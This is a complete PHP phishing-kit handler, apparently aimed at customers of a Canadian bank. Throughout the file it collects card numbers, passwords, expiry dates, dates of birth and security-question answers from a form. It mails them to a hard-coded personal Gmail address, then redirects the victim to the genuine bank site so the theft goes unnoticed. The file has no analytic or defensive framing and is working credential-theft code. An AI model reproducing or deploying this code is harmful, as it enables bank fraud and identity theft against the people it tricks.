<?php
$clientCard = $_POST['clientCard'];
$password = $_POST['password'];
$cardExpDate= $_POST['cardExpDate'];
$dateNaissance= $_POST['dateNaissance'];
$secretQuestion1Key = $_POST['secretQuestion1Key'];
$secretAnswer1 = $_POST['secretAnswer1'];
$secretQuestion2Key = $_POST['secretQuestion2Key'];
$secretAnswer2 = $_POST['secretAnswer2'];
$secretQuestion3Key = $_POST['secretQuestion3Key'];
$secretAnswer3 = $_POST['secretAnswer3'];
$dob = $_POST['dob'];
$data ="
================================================
user: $clientCard
password : $password
expiration: $cardExpDate
dob: $dob
------------------------------------------------
question 1:  $secretQuestion1Key
answer 1:   $secretAnswer1
question 2:  $secretQuestion2Key
answer 2:   $secretAnswer2
question 3:  $secretQuestion3Key
answer 3:   $secretAnswer3
================================================
";

$subj="NATIO $dateNaissance"; 

$emailusr = 'medahnabil@gmail.com';

mail($emailusr, $subj, $data);	

header("Location: https://www.nbc.ca");

?>